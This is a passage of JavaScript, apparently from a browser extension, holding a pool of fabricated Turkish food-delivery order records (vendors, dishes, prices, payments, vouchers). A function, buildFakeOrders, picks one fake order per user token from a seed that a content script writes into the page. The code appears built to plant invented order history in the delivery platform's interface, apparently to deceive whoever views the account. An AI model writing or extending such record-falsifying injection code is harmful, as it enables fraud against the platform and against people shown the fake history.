    {"current_status":{"code":16,"message":"RESTAURANTS_OTP_OD_PROGRESS_DELIVERED","type":"final","changedAt":{"date":"2024-01-06 21:03:39","timezone":"Europe/Istanbul"},"internal_status_code":"621 - "},"order_address":"Merkez Mah., Ataturk Cad., 5, 34000 Istanbul","delivery_address":{"id":100000012,"city":"Istanbul","address_line_1":"Ataturk Cad.","address_line_2":"5","address_line_3":"Merkez Mah.","address_line_4":"Istanbul","address_line_5":"","address_other":"","room":"","flat_number":"","structure":"","building":"","floor":"","district":"","postcode":"34000","company":"","latitude":41.0082,"longitude":28.9784,"delivery_instructions":""},"order_id":0,"order_code":"jj9k-hhhn","ordered_at":{"date":"2024-01-06 20:47:30","timezone":"Europe/Istanbul"},"confirmed_delivery_time":{"date":"2024-01-06 21:03:39","timezone":"Europe/Istanbul"},"total_value":62,"subtotal":162,"vendor":{"id":0,"code":"jj9k","name":"Zater Döner","logo":"","service_tax_percentage_amount":0,"service_fee_percentage_amount":0,"vat_percentage_amount":0,"is_service_fee_enabled":false,"is_service_tax_visible":false,"is_service_tax_enabled":false,"is_vat_visible":false,"is_vat_disabled":false,"address":"","latitude":37.743712,"longitude":29.09579257,"primary_cuisine_id":1064,"metadata":{"timezone":"Europe/Istanbul"},"city_id":0,"vertical":"restaurants","customer_contact_phone_number":"+902120000000","hero_listing_image":"https://images.deliveryhero.io/image/fd-tr/LH/jj9k-listing.jpg"},"voucher":{"voucher":"","expirationDate":1790542799000,"type":"amount","value":150,"description":""},"order_products":[{"name":"Patates Kızartması","name_attributes":{"style":"highlight","text_color":"neutral_primary","value":"Patates Kızartması","placeholders":null},"quantity_attributes":{"style":"highlight","text_color":"neutral_primary","value":1,"placeholders":null},"toppings_attributes":null,"special_instructions_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"","placeholders":null},"subtitle_attributes":null,"price_attributes":{"style":"body","text_color":"neutral_primary","value":40,"placeholders":null},"total_price":40,"quantity":1,"sold_out":false,"tag":null,"status":"available","weight_attributes":null,"replacement_products":[],"replacement_attributes":null,"is_meal_for_one":false},{"name":"XL Zater Tavuk Döner Dürüm","name_attributes":{"style":"highlight","text_color":"neutral_primary","value":"XL Zater Tavuk Döner Dürüm","placeholders":null},"quantity_attributes":{"style":"highlight","text_color":"neutral_primary","value":1,"placeholders":null},"toppings_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"Çift Lavaş","placeholders":null},"special_instructions_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"Yanına ekstra mayonez koyarsanız sevinirim. Ekstra lavasli olacak","placeholders":null},"subtitle_attributes":null,"price_attributes":{"style":"body","text_color":"neutral_primary","value":122,"placeholders":null},"total_price":122,"quantity":1,"sold_out":false,"tag":null,"status":"available","weight_attributes":null,"replacement_products":[],"replacement_attributes":null,"is_meal_for_one":false}],"sms_verification_needed":false,"order_already_rated":true,"has_been_reported_late":false,"rider_tip":0,"charity":0,"service_fee_total":0,"difference_to_minimum":0,"difference_to_minimum_with_vat":0,"expedition_type":"delivery","server_time":{"date":"2024-01-06 21:03:39","timezone":"Europe/Istanbul"},"payment_type_code":"yemekpay_creditcard","payment":{"breakdown":[{"code":"yemekpay_creditcard","group":"online_payment","translation_key":"OTP_PAID_WITH_ONLINE_PAYMENT","amount":62}]},"delivery_features":{"show_map":false,"display_map":false,"show_cart":false,"show_statuses":false,"show_vendor_contact":false,"show_vendor_delivery_time":false,"show_rider_chat":false,"show_payment_breakdown":false,"show_help_button":false},"delivery_provider":"own_delivery_foodpanda","is_cancellable":false,"status_flags":{"is_paid":true,"is_active":false,"is_picked_up":false,"is_delivered":true,"is_canceled":false,"is_preorder":false,"is_preorder_active":false,"is_past_order":true,"is_completed":true,"is_reorderable":true,"is_reorderable_after_cancellation":false,"is_rateable":false,"is_meal_for_one":false},"dynamic_fees":[],"loyalty":null,"status_messages":{"titles":[]},"status_history":[],"payment_refunds":[],"rider_tip_eligible":false,"reminder":null},
    {"current_status":{"code":16,"message":"RESTAURANTS_OTP_OD_PROGRESS_DELIVERED","type":"final","changedAt":{"date":"2025-05-25 16:45:55","timezone":"Europe/Istanbul"},"internal_status_code":"621 - "},"order_address":"Merkez Mah., Ataturk Cad., 5, 34000 Istanbul","delivery_address":{"id":100000010,"city":"Istanbul","address_line_1":"Ataturk Cad.","address_line_2":"5","address_line_3":"Merkez Mah.","address_line_4":"Istanbul","address_line_5":"","address_other":"","room":"","flat_number":"","structure":"","building":"","floor":"","district":"","postcode":"34000","company":"","latitude":41.0082,"longitude":28.9784,"delivery_instructions":""},"order_id":0,"order_code":"h9wt-jjxt","ordered_at":{"date":"2025-05-25 15:59:34","timezone":"Europe/Istanbul"},"confirmed_delivery_time":{"date":"2025-05-25 16:45:55","timezone":"Europe/Istanbul"},"total_value":178.59,"subtotal":356,"vendor":{"id":0,"code":"h9wt","name":"Öz Anteplioğlu Pide & Lahmacun & Dürüm","logo":"","service_tax_percentage_amount":0,"service_fee_percentage_amount":0,"vat_percentage_amount":0,"is_service_fee_enabled":false,"is_service_tax_visible":false,"is_service_tax_enabled":false,"is_vat_visible":false,"is_vat_disabled":false,"address":"","latitude":41.086517,"longitude":28.896555,"primary_cuisine_id":1080,"metadata":{"timezone":"Europe/Istanbul"},"city_id":0,"vertical":"restaurants","customer_contact_phone_number":"+902120000000","hero_listing_image":"https://images.deliveryhero.io/image/fd-tr/LH/h9wt-listing.jpg"},"voucher":{"voucher":"","expirationDate":1790542799000,"type":"amount","value":150,"description":""},"order_products":[{"name":"Su (50 cl.)","name_attributes":{"style":"highlight","text_color":"neutral_primary","value":"Su (50 cl.)","placeholders":null},"quantity_attributes":{"style":"highlight","text_color":"neutral_primary","value":2,"placeholders":null},"toppings_attributes":null,"special_instructions_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"","placeholders":null},"subtitle_attributes":null,"price_attributes":{"style":"body","text_color":"neutral_primary","value":36,"placeholders":null},"total_price":36,"quantity":2,"sold_out":false,"tag":null,"status":"available","weight_attributes":null,"replacement_products":[],"replacement_attributes":null,"is_meal_for_one":false},{"name":"Lahmacun","name_attributes":{"style":"highlight","text_color":"neutral_primary","value":"Lahmacun","placeholders":null},"quantity_attributes":{"style":"highlight","text_color":"neutral_primary","value":2,"placeholders":null},"toppings_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"Acılı","placeholders":null},"special_instructions_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"","placeholders":null},"subtitle_attributes":null,"price_attributes":{"style":"body","text_color":"neutral_primary","value":128,"placeholders":null},"total_price":128,"quantity":2,"sold_out":false,"tag":null,"status":"available","weight_attributes":null,"replacement_products":[],"replacement_attributes":null,"is_meal_for_one":false},{"name":"Lahmacun","name_attributes":{"style":"highlight","text_color":"neutral_primary","value":"Lahmacun","placeholders":null},"quantity_attributes":{"style":"highlight","text_color":"neutral_primary","value":3,"placeholders":null},"toppings_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"Acısız","placeholders":null},"special_instructions_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"","placeholders":null},"subtitle_attributes":null,"price_attributes":{"style":"body","text_color":"neutral_primary","value":192,"placeholders":null},"total_price":192,"quantity":3,"sold_out":false,"tag":null,"status":"available","weight_attributes":null,"replacement_products":[],"replacement_attributes":null,"is_meal_for_one":false}],"sms_verification_needed":false,"order_already_rated":true,"has_been_reported_late":false,"rider_tip":0,"charity":0,"service_fee_total":0,"difference_to_minimum":0,"difference_to_minimum_with_vat":0,"expedition_type":"delivery","server_time":{"date":"2025-05-25 16:45:55","timezone":"Europe/Istanbul"},"payment_type_code":"yemekpay_creditcard","payment":{"breakdown":[{"code":"yemekpay_creditcard","group":"online_payment","translation_key":"OTP_PAID_WITH_ONLINE_PAYMENT","amount":178.59}]},"delivery_features":{"show_map":false,"display_map":false,"show_cart":false,"show_statuses":false,"show_vendor_contact":false,"show_vendor_delivery_time":false,"show_rider_chat":false,"show_payment_breakdown":false,"show_help_button":false},"delivery_provider":"own_delivery_foodpanda","is_cancellable":false,"status_flags":{"is_paid":true,"is_active":false,"is_picked_up":false,"is_delivered":true,"is_canceled":false,"is_preorder":false,"is_preorder_active":false,"is_past_order":true,"is_completed":true,"is_reorderable":true,"is_reorderable_after_cancellation":false,"is_rateable":false,"is_meal_for_one":false},"dynamic_fees":[],"loyalty":null,"status_messages":{"titles":[]},"status_history":[],"payment_refunds":[],"rider_tip_eligible":false,"reminder":null},
    {"current_status":{"code":16,"message":"RESTAURANTS_OTP_OD_PROGRESS_DELIVERED","type":"final","changedAt":{"date":"2025-03-02 23:51:36","timezone":"Europe/Istanbul"},"internal_status_code":"621 - "},"order_address":"Merkez Mah., Ataturk Cad., 5, 34000 Istanbul","delivery_address":{"id":100000010,"city":"Istanbul","address_line_1":"Ataturk Cad.","address_line_2":"5","address_line_3":"Merkez Mah.","address_line_4":"Istanbul","address_line_5":"","address_other":"","room":"","flat_number":"","structure":"","building":"","floor":"","district":"","postcode":"34000","company":"","latitude":41.0082,"longitude":28.9784,"delivery_instructions":""},"order_id":0,"order_code":"d3hu-jvxg","ordered_at":{"date":"2025-03-02 23:36:49","timezone":"Europe/Istanbul"},"confirmed_delivery_time":{"date":"2025-03-02 23:51:36","timezone":"Europe/Istanbul"},"total_value":160,"subtotal":335,"vendor":{"id":0,"code":"d3hu","name":"Komagene Etsiz Çiğ Köfte","logo":"","service_tax_percentage_amount":0,"service_fee_percentage_amount":0,"vat_percentage_amount":0,"is_service_fee_enabled":false,"is_service_tax_visible":false,"is_service_tax_enabled":false,"is_vat_visible":false,"is_vat_disabled":false,"address":"","latitude":37.8612551,"longitude":32.5335752,"primary_cuisine_id":1061,"metadata":{"timezone":"Europe/Istanbul"},"city_id":0,"vertical":"restaurants","customer_contact_phone_number":"+902120000000","hero_listing_image":"https://images.deliveryhero.io/image/fd-tr/LH/ce6mj-listing.jpg"},"voucher":{"voucher":"","expirationDate":1790542799000,"type":"amount","value":150,"description":""},"order_products":[{"name":"%50 Kampanyalı Çiğ Köfte (600 g + 300 g)","name_attributes":{"style":"highlight","text_color":"neutral_primary","value":"%50 Kampanyalı Çiğ Köfte (600 g + 300 g)","placeholders":null},"quantity_attributes":{"style":"highlight","text_color":"neutral_primary","value":1,"placeholders":null},"toppings_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"Çiğ Köfte (600 gr.) (çok acılı), Çok Acı Sos (18 gr.), Çok Acı Sos (18 gr.), Çiğ Köfte Sos (18 gr.), İstemiyorum","placeholders":null},"special_instructions_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"","placeholders":null},"subtitle_attributes":null,"price_attributes":{"style":"body","text_color":"neutral_primary","value":335,"placeholders":null},"total_price":335,"quantity":1,"sold_out":false,"tag":null,"status":"available","weight_attributes":null,"replacement_products":[],"replacement_attributes":null,"is_meal_for_one":false}],"sms_verification_needed":false,"order_already_rated":true,"has_been_reported_late":false,"rider_tip":0,"charity":0,"service_fee_total":0,"difference_to_minimum":0,"difference_to_minimum_with_vat":0,"expedition_type":"delivery","server_time":{"date":"2025-03-02 23:51:36","timezone":"Europe/Istanbul"},"payment_type_code":"yemekpay_creditcard","payment":{"breakdown":[{"code":"yemekpay_creditcard","group":"online_payment","translation_key":"OTP_PAID_WITH_ONLINE_PAYMENT","amount":160}]},"delivery_features":{"show_map":false,"display_map":false,"show_cart":false,"show_statuses":false,"show_vendor_contact":false,"show_vendor_delivery_time":false,"show_rider_chat":false,"show_payment_breakdown":false,"show_help_button":false},"delivery_provider":"own_delivery_foodpanda","is_cancellable":false,"status_flags":{"is_paid":true,"is_active":false,"is_picked_up":false,"is_delivered":true,"is_canceled":false,"is_preorder":false,"is_preorder_active":false,"is_past_order":true,"is_completed":true,"is_reorderable":false,"is_reorderable_after_cancellation":false,"is_rateable":false,"is_meal_for_one":false},"dynamic_fees":[],"loyalty":null,"status_messages":{"titles":[]},"status_history":[],"payment_refunds":[],"rider_tip_eligible":false,"reminder":null},
    {"current_status":{"code":16,"message":"RESTAURANTS_OTP_VD_PROGRESS_DELIVERED","type":"final","changedAt":{"date":"2024-01-21 20:07:39","timezone":"Europe/Istanbul"},"internal_status_code":"621 - "},"order_address":"Merkez Mah., Ataturk Cad., 5, 34000 Istanbul","delivery_address":{"id":100000010,"city":"Istanbul","address_line_1":"Ataturk Cad.","address_line_2":"5","address_line_3":"Merkez Mah.","address_line_4":"Istanbul","address_line_5":"","address_other":"","room":"","flat_number":"","structure":"","building":"","floor":"","district":"","postcode":"34000","company":"","latitude":41.0082,"longitude":28.9784,"delivery_instructions":""},"order_id":0,"order_code":"enk6-g0z8","ordered_at":{"date":"2024-01-21 17:06:58","timezone":"Europe/Istanbul"},"confirmed_delivery_time":{"date":"2024-01-21 17:36:39","timezone":"Europe/Istanbul"},"total_value":150,"subtotal":250,"vendor":{"id":0,"code":"enk6","name":"Şahin Kebap","logo":"","service_tax_percentage_amount":0,"service_fee_percentage_amount":0,"vat_percentage_amount":0,"is_service_fee_enabled":false,"is_service_tax_visible":false,"is_service_tax_enabled":false,"is_vat_visible":false,"is_vat_disabled":false,"address":"","latitude":38.394415,"longitude":27.009139,"primary_cuisine_id":1071,"metadata":{"timezone":"Europe/Istanbul"},"city_id":0,"vertical":"restaurants","customer_contact_phone_number":"+902120000000","hero_listing_image":"https://images.deliveryhero.io/image/fd-tr/LH/enk6-listing.jpg"},"voucher":{"voucher":"","expirationDate":1790542799000,"type":"amount","value":150,"description":""},"order_products":[{"name":"İskender (Et Dönerden)","name_attributes":{"style":"highlight","text_color":"neutral_primary","value":"İskender (Et Dönerden)","placeholders":null},"quantity_attributes":{"style":"highlight","text_color":"neutral_primary","value":1,"placeholders":null},"toppings_attributes":null,"special_instructions_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"","placeholders":null},"subtitle_attributes":null,"price_attributes":{"style":"body","text_color":"neutral_primary","value":250,"placeholders":null},"total_price":250,"quantity":1,"sold_out":false,"tag":null,"status":"available","weight_attributes":null,"replacement_products":[],"replacement_attributes":null,"is_meal_for_one":false}],"sms_verification_needed":false,"order_already_rated":true,"has_been_reported_late":false,"rider_tip":0,"charity":0,"service_fee_total":0,"difference_to_minimum":0,"difference_to_minimum_with_vat":0,"expedition_type":"delivery","server_time":{"date":"2024-01-21 17:36:39","timezone":"Europe/Istanbul"},"payment_type_code":"yemekpay_creditcard","payment":{"breakdown":[{"code":"yemekpay_creditcard","group":"online_payment","translation_key":"OTP_PAID_WITH_ONLINE_PAYMENT","amount":150}]},"delivery_features":{"show_map":false,"display_map":false,"show_cart":false,"show_statuses":false,"show_vendor_contact":false,"show_vendor_delivery_time":false,"show_rider_chat":false,"show_payment_breakdown":false,"show_help_button":false},"delivery_provider":"vendor","is_cancellable":false,"status_flags":{"is_paid":true,"is_active":false,"is_picked_up":false,"is_delivered":true,"is_canceled":false,"is_preorder":false,"is_preorder_active":false,"is_past_order":true,"is_completed":true,"is_reorderable":true,"is_reorderable_after_cancellation":false,"is_rateable":false,"is_meal_for_one":false},"dynamic_fees":[],"loyalty":null,"status_messages":{"titles":[]},"status_history":[],"payment_refunds":[],"rider_tip_eligible":false,"reminder":null},
    {"current_status":{"code":16,"message":"RESTAURANTS_OTP_VD_PROGRESS_DELIVERED","type":"final","changedAt":{"date":"2025-05-27 20:00:21","timezone":"Europe/Istanbul"},"internal_status_code":"621 - "},"order_address":"Merkez Mah., Ataturk Cad., 5, 34000 Istanbul","delivery_address":{"id":100000010,"city":"Istanbul","address_line_1":"Ataturk Cad.","address_line_2":"5","address_line_3":"Merkez Mah.","address_line_4":"Istanbul","address_line_5":"","address_other":"","room":"","flat_number":"","structure":"","building":"","floor":"","district":"","postcode":"34000","company":"","latitude":41.0082,"longitude":28.9784,"delivery_instructions":""},"order_id":0,"order_code":"cw12-1dwa","ordered_at":{"date":"2025-05-27 16:58:19","timezone":"Europe/Istanbul"},"confirmed_delivery_time":{"date":"2025-05-27 17:28:18","timezone":"Europe/Istanbul"},"total_value":300,"subtotal":450,"vendor":{"id":0,"code":"cw12","name":"Gaziantepli Bozoğlu Baklava & Börek","logo":"","service_tax_percentage_amount":0,"service_fee_percentage_amount":0,"vat_percentage_amount":0,"is_service_fee_enabled":false,"is_service_tax_visible":false,"is_service_tax_enabled":false,"is_vat_visible":false,"is_vat_disabled":false,"address":"","latitude":36.86976,"longitude":30.735112,"primary_cuisine_id":1086,"metadata":{"timezone":"Europe/Istanbul"},"city_id":0,"vertical":"restaurants","customer_contact_phone_number":"+902120000000","hero_listing_image":"https://images.deliveryhero.io/image/fd-tr/LH/cw12-listing.jpg"},"voucher":{"voucher":"","expirationDate":1790542799000,"type":"amount","value":150,"description":""},"order_products":[{"name":"Fıstıklı Kadayıf (500 gr.)","name_attributes":{"style":"highlight","text_color":"neutral_primary","value":"Fıstıklı Kadayıf (500 gr.)","placeholders":null},"quantity_attributes":{"style":"highlight","text_color":"neutral_primary","value":1,"placeholders":null},"toppings_attributes":null,"special_instructions_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"","placeholders":null},"subtitle_attributes":null,"price_attributes":{"style":"body","text_color":"neutral_primary","value":450,"placeholders":null},"total_price":450,"quantity":1,"sold_out":false,"tag":null,"status":"available","weight_attributes":null,"replacement_products":[],"replacement_attributes":null,"is_meal_for_one":false}],"sms_verification_needed":false,"order_already_rated":true,"has_been_reported_late":false,"rider_tip":0,"charity":0,"service_fee_total":0,"difference_to_minimum":0,"difference_to_minimum_with_vat":0,"expedition_type":"delivery","server_time":{"date":"2025-05-27 17:28:18","timezone":"Europe/Istanbul"},"payment_type_code":"yemekpay_creditcard","payment":{"breakdown":[{"code":"yemekpay_creditcard","group":"online_payment","translation_key":"OTP_PAID_WITH_ONLINE_PAYMENT","amount":300}]},"delivery_features":{"show_map":false,"display_map":false,"show_cart":false,"show_statuses":false,"show_vendor_contact":false,"show_vendor_delivery_time":false,"show_rider_chat":false,"show_payment_breakdown":false,"show_help_button":false},"delivery_provider":"vendor","is_cancellable":false,"status_flags":{"is_paid":true,"is_active":false,"is_picked_up":false,"is_delivered":true,"is_canceled":false,"is_preorder":false,"is_preorder_active":false,"is_past_order":true,"is_completed":true,"is_reorderable":true,"is_reorderable_after_cancellation":false,"is_rateable":false,"is_meal_for_one":false},"dynamic_fees":[],"loyalty":null,"status_messages":{"titles":[]},"status_history":[],"payment_refunds":[],"rider_tip_eligible":false,"reminder":null},
    {"current_status":{"code":16,"message":"RESTAURANTS_OTP_OD_PROGRESS_DELIVERED","type":"final","changedAt":{"date":"2024-02-03 16:30:13","timezone":"Europe/Istanbul"},"internal_status_code":"621 - "},"order_address":"Merkez Mah., Ataturk Cad., 5, 34000 Istanbul","delivery_address":{"id":100000010,"city":"Istanbul","address_line_1":"Ataturk Cad.","address_line_2":"5","address_line_3":"Merkez Mah.","address_line_4":"Istanbul","address_line_5":"","address_other":"","room":"","flat_number":"","structure":"","building":"","floor":"","district":"","postcode":"34000","company":"","latitude":41.0082,"longitude":28.9784,"delivery_instructions":""},"order_id":0,"order_code":"u1kt-5u5s","ordered_at":{"date":"2024-02-03 15:51:33","timezone":"Europe/Istanbul"},"confirmed_delivery_time":{"date":"2024-02-03 16:30:13","timezone":"Europe/Istanbul"},"total_value":50,"subtotal":170,"vendor":{"id":0,"code":"u1kt","name":"Köfteci Yusuf","logo":"","service_tax_percentage_amount":0,"service_fee_percentage_amount":0,"vat_percentage_amount":0,"is_service_fee_enabled":false,"is_service_tax_visible":false,"is_service_tax_enabled":false,"is_vat_visible":false,"is_vat_disabled":false,"address":"","latitude":41.0072663,"longitude":28.7958602,"primary_cuisine_id":1073,"metadata":{"timezone":"Europe/Istanbul"},"city_id":0,"vertical":"restaurants","customer_contact_phone_number":"+902120000000","hero_listing_image":"https://images.deliveryhero.io/image/fd-tr/LH/ck5yy-listing.jpg"},"voucher":{"voucher":"","expirationDate":1790542799000,"type":"amount","value":150,"description":""},"order_products":[{"name":"Soğan Halkası (3 Adet)","name_attributes":{"style":"highlight","text_color":"neutral_primary","value":"Soğan Halkası (3 Adet)","placeholders":null},"quantity_attributes":{"style":"highlight","text_color":"neutral_primary","value":1,"placeholders":null},"toppings_attributes":null,"special_instructions_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"","placeholders":null},"subtitle_attributes":null,"price_attributes":{"style":"body","text_color":"neutral_primary","value":10,"placeholders":null},"total_price":10,"quantity":1,"sold_out":false,"tag":null,"status":"available","weight_attributes":null,"replacement_products":[],"replacement_attributes":null,"is_meal_for_one":false},{"name":"Köfteci Yusuf Acılı Parmak Sucuk (Fermente) (500 gr.)","name_attributes":{"style":"highlight","text_color":"neutral_primary","value":"Köfteci Yusuf Acılı Parmak Sucuk (Fermente) (500 gr.)","placeholders":null},"quantity_attributes":{"style":"highlight","text_color":"neutral_primary","value":1,"placeholders":null},"toppings_attributes":null,"special_instructions_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"","placeholders":null},"subtitle_attributes":null,"price_attributes":{"style":"body","text_color":"neutral_primary","value":160,"placeholders":null},"total_price":160,"quantity":1,"sold_out":false,"tag":null,"status":"available","weight_attributes":null,"replacement_products":[],"replacement_attributes":null,"is_meal_for_one":false}],"sms_verification_needed":false,"order_already_rated":true,"has_been_reported_late":false,"rider_tip":0,"charity":0,"service_fee_total":0,"difference_to_minimum":0,"difference_to_minimum_with_vat":0,"expedition_type":"delivery","server_time":{"date":"2024-02-03 16:30:13","timezone":"Europe/Istanbul"},"payment_type_code":"yemekpay_creditcard","payment":{"breakdown":[{"code":"yemekpay_creditcard","group":"online_payment","translation_key":"OTP_PAID_WITH_ONLINE_PAYMENT","amount":50}]},"delivery_features":{"show_map":false,"display_map":false,"show_cart":false,"show_statuses":false,"show_vendor_contact":false,"show_vendor_delivery_time":false,"show_rider_chat":false,"show_payment_breakdown":false,"show_help_button":false},"delivery_provider":"own_delivery_foodpanda","is_cancellable":false,"status_flags":{"is_paid":true,"is_active":false,"is_picked_up":false,"is_delivered":true,"is_canceled":false,"is_preorder":false,"is_preorder_active":false,"is_past_order":true,"is_completed":true,"is_reorderable":true,"is_reorderable_after_cancellation":false,"is_rateable":false,"is_meal_for_one":false},"dynamic_fees":[],"loyalty":null,"status_messages":{"titles":[]},"status_history":[],"payment_refunds":[],"rider_tip_eligible":false,"reminder":null},
    {"current_status":{"code":16,"message":"RESTAURANTS_OTP_VD_PROGRESS_DELIVERED","type":"final","changedAt":{"date":"2025-03-07 21:23:05","timezone":"Europe/Istanbul"},"internal_status_code":"621 - "},"order_address":"Merkez Mah., Ataturk Cad., 5, 34000 Istanbul","delivery_address":{"id":100000010,"city":"Istanbul","address_line_1":"Ataturk Cad.","address_line_2":"5","address_line_3":"Merkez Mah.","address_line_4":"Istanbul","address_line_5":"","address_other":"","room":"","flat_number":"","structure":"","building":"","floor":"","district":"","postcode":"34000","company":"","latitude":41.0082,"longitude":28.9784,"delivery_instructions":""},"order_id":0,"order_code":"uvln-2510-sudx","ordered_at":{"date":"2025-03-07 18:22:12","timezone":"Europe/Istanbul"},"confirmed_delivery_time":{"date":"2025-03-07 18:51:02","timezone":"Europe/Istanbul"},"total_value":160,"subtotal":335,"vendor":{"id":0,"code":"uvln","name":"En Trendy Pizza","logo":"","service_tax_percentage_amount":0,"service_fee_percentage_amount":0,"vat_percentage_amount":0,"is_service_fee_enabled":false,"is_service_tax_visible":false,"is_service_tax_enabled":false,"is_vat_visible":false,"is_vat_disabled":false,"address":"","latitude":37.169225,"longitude":28.380262,"primary_cuisine_id":1082,"metadata":{"timezone":"Europe/Istanbul"},"city_id":0,"vertical":"restaurants","customer_contact_phone_number":"+902120000000","hero_listing_image":"https://images.deliveryhero.io/image/fd-tr/LH/uvln-listing.jpg"},"voucher":{"voucher":"","expirationDate":1790542799000,"type":"amount","value":150,"description":""},"order_products":[{"name":"Izgara Sporcu Tavuk","name_attributes":{"style":"highlight","text_color":"neutral_primary","value":"Izgara Sporcu Tavuk","placeholders":null},"quantity_attributes":{"style":"highlight","text_color":"neutral_primary","value":1,"placeholders":null},"toppings_attributes":null,"special_instructions_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"","placeholders":null},"subtitle_attributes":null,"price_attributes":{"style":"body","text_color":"neutral_primary","value":335,"placeholders":null},"total_price":335,"quantity":1,"sold_out":false,"tag":null,"status":"available","weight_attributes":null,"replacement_products":[],"replacement_attributes":null,"is_meal_for_one":false}],"sms_verification_needed":false,"order_already_rated":true,"has_been_reported_late":false,"rider_tip":0,"charity":0,"service_fee_total":0,"difference_to_minimum":0,"difference_to_minimum_with_vat":0,"expedition_type":"delivery","server_time":{"date":"2025-03-07 18:51:02","timezone":"Europe/Istanbul"},"payment_type_code":"yemekpay_creditcard","payment":{"breakdown":[{"code":"yemekpay_creditcard","group":"online_payment","translation_key":"OTP_PAID_WITH_ONLINE_PAYMENT","amount":160}]},"delivery_features":{"show_map":false,"display_map":false,"show_cart":false,"show_statuses":false,"show_vendor_contact":false,"show_vendor_delivery_time":false,"show_rider_chat":false,"show_payment_breakdown":false,"show_help_button":false},"delivery_provider":"vendor","is_cancellable":false,"status_flags":{"is_paid":true,"is_active":false,"is_picked_up":false,"is_delivered":true,"is_canceled":false,"is_preorder":false,"is_preorder_active":false,"is_past_order":true,"is_completed":true,"is_reorderable":true,"is_reorderable_after_cancellation":false,"is_rateable":false,"is_meal_for_one":false},"dynamic_fees":[],"loyalty":null,"status_messages":{"titles":[]},"status_history":[],"payment_refunds":[],"rider_tip_eligible":false,"reminder":null},
    {"current_status":{"code":16,"message":"RESTAURANTS_OTP_OD_PROGRESS_DELIVERED","type":"final","changedAt":{"date":"2024-01-09 17:37:21","timezone":"Europe/Istanbul"},"internal_status_code":"621 - "},"order_address":"Merkez Mah., Ataturk Cad., 5, 34000 Istanbul","delivery_address":{"id":100000010,"city":"Istanbul","address_line_1":"Ataturk Cad.","address_line_2":"5","address_line_3":"Merkez Mah.","address_line_4":"Istanbul","address_line_5":"","address_other":"","room":"","flat_number":"","structure":"","building":"","floor":"","district":"","postcode":"34000","company":"","latitude":41.0082,"longitude":28.9784,"delivery_instructions":""},"order_id":0,"order_code":"bms4-umc5","ordered_at":{"date":"2024-01-09 17:20:01","timezone":"Europe/Istanbul"},"confirmed_delivery_time":{"date":"2024-01-09 17:37:21","timezone":"Europe/Istanbul"},"total_value":55,"subtotal":155,"vendor":{"id":0,"code":"bms4","name":"Dürümle","logo":"","service_tax_percentage_amount":0,"service_fee_percentage_amount":0,"vat_percentage_amount":0,"is_service_fee_enabled":false,"is_service_tax_visible":false,"is_service_tax_enabled":false,"is_vat_visible":false,"is_vat_disabled":false,"address":"","latitude":37.7820313,"longitude":30.5450488,"primary_cuisine_id":1071,"metadata":{"timezone":"Europe/Istanbul"},"city_id":0,"vertical":"restaurants","customer_contact_phone_number":"+902120000000","hero_listing_image":"https://images.deliveryhero.io/image/fd-tr/LH/cn4bs-listing.jpg"},"voucher":{"voucher":"","expirationDate":1790542799000,"type":"amount","value":150,"description":""},"order_products":[{"name":"Soslu Tavuk Dürümle","name_attributes":{"style":"highlight","text_color":"neutral_primary","value":"Soslu Tavuk Dürümle","placeholders":null},"quantity_attributes":{"style":"highlight","text_color":"neutral_primary","value":1,"placeholders":null},"toppings_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"Dürümle Sos (Adet), soslu tavuk dürüm, soğan istemiyorum","placeholders":null},"special_instructions_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"","placeholders":null},"subtitle_attributes":null,"price_attributes":{"style":"body","text_color":"neutral_primary","value":155,"placeholders":null},"total_price":155,"quantity":1,"sold_out":false,"tag":null,"status":"available","weight_attributes":null,"replacement_products":[],"replacement_attributes":null,"is_meal_for_one":false}],"sms_verification_needed":false,"order_already_rated":true,"has_been_reported_late":false,"rider_tip":0,"charity":0,"service_fee_total":0,"difference_to_minimum":0,"difference_to_minimum_with_vat":0,"expedition_type":"delivery","server_time":{"date":"2024-01-09 17:37:21","timezone":"Europe/Istanbul"},"payment_type_code":"yemekpay_creditcard","payment":{"breakdown":[{"code":"yemekpay_creditcard","group":"online_payment","translation_key":"OTP_PAID_WITH_ONLINE_PAYMENT","amount":55}]},"delivery_features":{"show_map":false,"display_map":false,"show_cart":false,"show_statuses":false,"show_vendor_contact":false,"show_vendor_delivery_time":false,"show_rider_chat":false,"show_payment_breakdown":false,"show_help_button":false},"delivery_provider":"own_delivery_foodpanda","is_cancellable":false,"status_flags":{"is_paid":true,"is_active":false,"is_picked_up":false,"is_delivered":true,"is_canceled":false,"is_preorder":false,"is_preorder_active":false,"is_past_order":true,"is_completed":true,"is_reorderable":true,"is_reorderable_after_cancellation":false,"is_rateable":false,"is_meal_for_one":false},"dynamic_fees":[],"loyalty":null,"status_messages":{"titles":[]},"status_history":[],"payment_refunds":[],"rider_tip_eligible":false,"reminder":null}
  ];

  function _deepClone(o) { try { return JSON.parse(JSON.stringify(o)); } catch (e) { return o; } }

  // Fake siparis TOKEN'a gore SABIT secilir: ayni token -> HEP AYNI siparis
  // (kullanici girip ciksa da degismez). Seed = content_script'in yazdigi
  // data-ys-orders-seed (token hash'i). Havuz buyudukce her token farkli siparis alir.
  function _getOrdersSeed() {
    try {
      var v = document.documentElement.getAttribute('data-ys-orders-seed');
      var n = v ? parseInt(v, 10) : 0;
      return (n && n > 0) ? n : 0;
    } catch (e) { return 0; }
  }
  function buildFakeOrders(baseTs) {
    var n = FAKE_ORDER_POOL.length;
    if (n === 0) return [];
    var seed = _getOrdersSeed();
    var index = ((seed % n) + n) % n; // token'a gore SABIT tek siparis
    var f = _deepClone(FAKE_ORDER_POOL[index]);
    var ts = baseTs - 24 * 60 * 60 * 1000;
